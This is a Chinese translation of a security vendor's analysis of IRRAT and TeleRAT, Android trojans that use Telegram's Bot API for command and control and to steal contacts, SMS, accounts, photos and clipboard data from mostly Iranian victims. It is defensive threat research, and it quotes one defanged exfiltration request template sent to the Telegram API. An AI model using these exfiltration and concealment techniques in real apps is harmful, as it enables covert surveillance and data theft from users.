> 原文链接: https://www.anquanke.com//post/id/102398 


# TeleRAT：再次发现利用Telegram来定位伊朗用户的Android恶意软件


                                阅读量   
                                **148850**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



##### 译文声明

本文是翻译文章，文章原作者 Ruchna Nigam and Kyle Wilhoit ，文章来源：
                                <br>原文地址：[https://researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/](https://researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01caf82420e90595ff.png)](https://p1.ssl.qhimg.com/t01caf82420e90595ff.png)



## 概要

Telegram Bots是一种特殊的帐户，不需要额外的电话号码来设置，通常用来丰富与外部服务的内容或得到自定义的通知和新闻。虽然Android恶意软件滥用Telegram的Bot API来定位伊朗用户已不是新闻(木马使用这种方法的出现被称为IRRAT于2017年6月和7月)，此篇报告主要研究这些Telegram的Bots是如何被Android恶意软件滥用和控制的。

此篇报告详细介绍了我们通过一些Operational Security (OPSEC)的失误，同时筛选多个滥用Telegram的Bot API的恶意APK变种；包括新发现的恶意软件，我们已经命名为“TeleRAT”。TeleRAT不仅滥用了Telegram的 Bot API作为C&amp;C，还滥用它进行数据的过滤，这是与IRRAT的不同之处。



## 我们已知的恶意软件- IRRAT

根据之前的报告，我们知道Telegram的Bot API已经被攻击者利用，从受感染的Android设备短信和通话记录文件中窃取信息。我们看到的大多数应用都伪装成一款应用，它可以告诉你多少人访问过你的Telegram profile信息页面——但是提供的信息并不准确的，因为Telegram不允许获取任何这样的信息。

到目前为止，我们仍然看到IRRAT存在活跃。

我们使用下面的样本进行分析。
<td width="49">**SHA256**</td><td width="402">1d0770ac48f8661a5d1595538c60710f886c254205b8cf517e118c94b256137d</td>

TeleRAT（<u>注：我们认为应该是</u><u>IRRAT</u>）的工作原理是在手机的SD卡上读取以下文件，并在应用程序第一次启动后将其发送到上传服务器：
- “[IMEI] numbers.txt”：联系人信息
- “[IMEI] acc.txt”：手机上注册的Google帐户列表
- “[IMEI] sms.txt”：历史短信
- jpg：用前置摄像头拍摄的照片
- jpg：使用背面照相机拍摄的照片
最后，它会反馈给Telegram bot（通过由每个RAT源代码中硬编码bot ID识别）并将其与下面的标识信息连接起来，然后程序图标会从手机的菜单中隐藏：

```
hxxp://api.telegram.org/bot[APIKey]/sendmessage?chat_id=[ChatID]?text=نصب جدید\n [IMEI] \nIMEI : :[IMEI]\n
Android ID : [AndroidID]\nModel : [PhoneModel]\n[IP] \n\nIMEI دستگاه: [IMEI]
```

在后台，应用会定期向Telegram Bot发出信号，并监听特定的命令，如下所示。

**[![](https://p3.ssl.qhimg.com/t011661480079369e03.png)](https://p3.ssl.qhimg.com/t011661480079369e03.png)<br>****表1 ：IRRAT bot命令列表**

如上表所示，此IRRAT示例仅使用Telegram的bot API将命令传达给受感染的设备。被盗的数据上传到第三方服务器，其中几个使用虚拟主机服务。对我们来说幸运的是，这些服务器有几个OPSEC失误。更多内容后面会提及。



## 一个新的家族- TeleRAT

在使用AutoFocus对IRRAT样本进行筛选时，我们遇到了另一Android RAT家族，它们似乎针对伊朗的个人，不仅利用Telegram API作为C&amp;C，还用于回传盗取的信息。

[![](https://p5.ssl.qhimg.com/t01a6ae5c388feb5bec.png)](https://p5.ssl.qhimg.com/t01a6ae5c388feb5bec.png)

**图1 ：在AutoFocus系统中找到的使用Telegram bot API的恶意软件**

我们将其命名为“TeleRAT”。

使用下面的样本进行分析。
<td width="49">**SHA256**</td><td width="402">01fef43c059d6b37be7faf47a08eccbf76cf7f050a7340ac2cae11942f27eb1d</td>

安装TeleRAT后在内部目录中创建两个文件：
- txt：包含有关设备的大量信息-包括System Bootloader版本号，内部存储和外部存储的总大小、可用数量，以及内核数量。
- txt：记录了Telegram channel和一系列指令。Telegram channel会在后面详细介绍。
RAT成功安装后向攻击者发送一个Telegram bot消息，包含当前日期和时间。

更有意思的是，它启动了一个服务，用于监听后台对剪贴板所做的更改。

[![](https://p4.ssl.qhimg.com/t0131f2038393a25273.png)](https://p4.ssl.qhimg.com/t0131f2038393a25273.png)

**图2 ：监听剪贴板更改的代码片段**

最后，应用程序每4.6秒从Telegram bot API获取更新，监听以下命令

[![](https://p3.ssl.qhimg.com/t0165fdf69b698b3995.png)](https://p3.ssl.qhimg.com/t0165fdf69b698b3995.png)

[![](https://p0.ssl.qhimg.com/t01e952c0664d9e81aa.png)](https://p0.ssl.qhimg.com/t01e952c0664d9e81aa.png)

** ****表2 ：TeleRAT bot命令列表**

除了附加命令之外，TeleRAT与IRRAT的主要区别在于它还使用Telegram的sendDocument API上传了已隐私数据数据。

[![](https://p0.ssl.qhimg.com/t017c5696d40d524bea.png)](https://p0.ssl.qhimg.com/t017c5696d40d524bea.png)

**图3 ：使用SendDocument Telegram bot API方法的代码片段**

** **TeleRAT是IRRAT的升级版，它避免了IRRAT基于向已知服务器传输数据的网络检测方式，因为所有通信(包括上传)都是通过Telegram bot API完成的。但它仍然留下了一些基于使用Telegram’s bot API的一些痕迹，例如硬编码在APK文件中的API密钥。

API允许通过两种方式获取更新：
1. getUpdates方法：使用这个方法公开了发送给bot的所有命令的历史记录，包括命令来自的用户名。从仍在响应并具有更新历史记录的bots（根据Telegram的政策，接收更新只保留24小时），我们能够找到来自四个Telegram帐户的bot命令，如下所示。
[![](https://p2.ssl.qhimg.com/t01575b45a8cf9a0321.png)](https://p2.ssl.qhimg.com/t01575b45a8cf9a0321.png)

**图4 ：从bot命令历史中展现的Telegram用户名**

2.使用Webhook：Telegram允许将所有bot更新重定向到通过Webhook指定的URL。他们的策略仅将这些Webhook限制为HTTPS URL。虽然大多数Webhooks使用Let’s Encrypt发布的证书，且这些证书并没有具体的注册信息，但其中一些证书已经指引我们找到第三方网络托管和开放目录。已经将此活动通知了Let’s Encrypt。

下面显示了我们发现的仅有几个Webhook的示例。hxxps：// mr-mehran [.] tk / pot / Bot /托管了近6500个机器人，但是，我们无法确认它们是否全部用于恶意目的。

[![](https://p3.ssl.qhimg.com/t0186907945d28bf9e8.png)](https://p3.ssl.qhimg.com/t0186907945d28bf9e8.png)

**图5：发现与某些TeleRAT bot相关的Webhooks**



## OPSEC失败，分销渠道和归属

在我们的研究中，我们从RAT bot控制端发现了一个很清晰的图像，在图像的下半部分的屏幕上可以看到的Telegram bot界面。

[![](https://p2.ssl.qhimg.com/t018dfb84a1a9f41061.png)](https://p2.ssl.qhimg.com/t018dfb84a1a9f41061.png)

**图 6：botmaster测试RAT的图像**

我们还发现了一些线索，证实了我们关于测试运行的猜测，并发现了一个波斯语的线程，似乎在讨论机器人的设置。

“صبحساعت6انلاینشوتاروباتهروامتحانکنیم”

谷歌翻译：“ 早晨6小时在线试用机器人 ”

在调查TeleRAT的归属时，我们注意到开发者没有在代码中隐藏自己的身份。并发现了一个用户名。

[![](https://p1.ssl.qhimg.com/t0196c4bcf10dd9d502.png)](https://p1.ssl.qhimg.com/t0196c4bcf10dd9d502.png)

**图7：在源代码中公布的Telegram 渠道**

** **

进一步查找“vahidmail67”的Telegram channel，我们发现了应用程序和构建器的广告，这些应用程序和构建器涵盖的范围很广——从热门应用程序到Instagram，再到勒索软件，甚至是一个未命名的RAT病毒的源代码(完整的视频教程，如下所示)。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0114bc7c2d7ea80d83.png)

**图8：Telegram 渠道广告和共享RAT源代码的屏幕截图**

除了Telegram channel，在寻找某些TeleRAT组件的参考资料时，我们偶然发现了伊朗程序员论坛上的一些线索，宣传Telegram bot控制库的销售。该论坛经常被一些开发人员光顾，他们的代码在我们遇到的大部分TeleRAT示例中被大量重复使用。

[![](https://p3.ssl.qhimg.com/t01525ae5d3fefde034.png)](https://p3.ssl.qhimg.com/t01525ae5d3fefde034.png)

**图9：出售Telegram bot 控制库的广告**

论坛的内容是，所有内容都符合伊朗的法律。但是，很难看到一些非恶意使用的代码，或者是开发人员经常编写的代码——例如，在后台运行的服务，监听到剪贴板的更改(如图3中代码片段所示)

[![](https://p5.ssl.qhimg.com/t0104b39f16932a7822.png)](https://p5.ssl.qhimg.com/t0104b39f16932a7822.png)

**图10：论坛免责声明**

总的来说，TeleRAT是由几个开发人员编写的代码结合起来的，但由于免费源代码通过Telegram论坛上流通和售卖，我们无法确认某一个人就是IRRAT或TeleRAT的作者，而是几个在伊朗内部活动的人联合开发。



## 受害者

当我们调查这些RAT时，我们也开始研究受害者是如何被感染的。在进一步的调查中，我们看到了一些第三方的Android应用程序商店，分布着看似合法的应用程序，比如“Telegram Finder”，它可以帮助用户定位并与其他特定兴趣的用途进行沟通，比如编织。此外，我们还看到了一些通过合法和不法的伊朗Telegram渠道分发和分享的样本。

[![](https://p0.ssl.qhimg.com/t01bafd4843c074803b.png)](https://p0.ssl.qhimg.com/t01bafd4843c074803b.png)

**图11：合法的伊朗第三方应用程序商店**

仔细观察恶意APK，我们可以全面了解常见的应用程序命名方式和功能。

[![](https://p3.ssl.qhimg.com/t01bbcdc28242595b62.png)](https://p3.ssl.qhimg.com/t01bbcdc28242595b62.png)

**图12：’Telegram finder’ 应用程序**

根据我们分析的样本，IRRAT和TeleRAT的三个最常见的应用名称是：
<td width="129">**Native App Name**</td><td width="89">**Translated App Name**</td>
<td width="129">**پروفایل چکر**</td><td width="89">Profile Cheer</td>
<td width="129">**بازدید** **یاب تلگرام**</td><td width="89">Telegram Finder</td>
<td width="129">telegram hacker</td><td width="89">N/A</td>

另外，还有一些伪装成虚假VPN软件或配置文件的恶意APK，例如“atom vpn”和“vpn for telegram”。

根据我们的分析，在撰写本文时，总共有2293名受害者。其中一小部分受害者在地理上比较分散，另有82％的受害者是在伊朗。
<td width="117">Iran</td><td width="64">1894</td>
<td width="117">Pakistan</td><td width="64">10</td>
<td width="117">India</td><td width="64">227</td>
<td width="117">Afghanistan</td><td width="64">109</td>
<td width="117">United Kingdom</td><td width="64">53</td>

在撰写本文时，可能还会有我们并未察觉或未统计到的人群。也就是说，可能居住在伊朗境内的受害者人数远远超过任何其他国家的受害者人数。



## 结论

剖析和理解新威胁也包括了仔细研究已知的恶意软件及其变种。这就是一个完美的例子，仔细观察先前建立的恶意软件家族，以便更好地了解其当前和可能演变的功能。

虽然利用Telegram bot API的恶意软件不一定是新的，但我们能够确定一个新的家族TeleRAT，利用Telegram API既可回传隐私数据，又可彻底逃避基于网络的检测。
